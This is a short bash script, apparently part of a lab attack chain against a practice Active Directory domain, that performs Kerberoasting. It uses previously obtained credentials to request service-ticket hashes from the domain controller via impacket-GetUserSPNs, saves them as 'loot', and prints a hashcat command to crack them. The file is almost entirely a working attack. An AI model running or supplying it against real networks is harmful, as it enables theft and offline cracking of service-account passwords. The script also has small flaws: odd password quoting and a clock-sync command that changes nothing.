#!/bin/bash
# Kerberoasting using previously obtained valid domain credentials
# Usage: ./03_kerberoast.sh <DOMAIN> <DC_IP> <USERNAME> <PASSWORD>

DOMAIN="${1:-vulncorp.local}"
DC_IP="${2:-192.168.56.10}"
USER="${3}"
PASS="${4}"

if [[ -z "$USER" || -z "$PASS" ]]; then
  echo "Usage: $0 <DOMAIN> <DC_IP> <USERNAME> <PASSWORD>"
  exit 1
fi

impacket-GetUserSPNs "$DOMAIN"/"$USER":"'$PASS'" -dc-ip "$DC_IP" \
  -request -outputfile ../loot/kerberoast_hashes.txt

echo "[*] Hashes (if any) saved to loot/kerberoast_hashes.txt"
echo "[*] Crack with: hashcat -m 13100 loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force"
echo ""
echo "NOTE: If you see KRB_AP_ERR_SKEW, sync Kali's clock to the DC first:"
echo "  sudo date -s \"\$(date -d @\$(( \$(date +%s) )) '+%Y-%m-%d %H:%M:%S')\"  # manual match to DC01 Get-Date"
echo "  # If it keeps reverting, disable VirtualBox host-time sync from the HOST:"
echo "  #   VBoxManage setextradata \"<VMName>\" \"VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled\" 1"
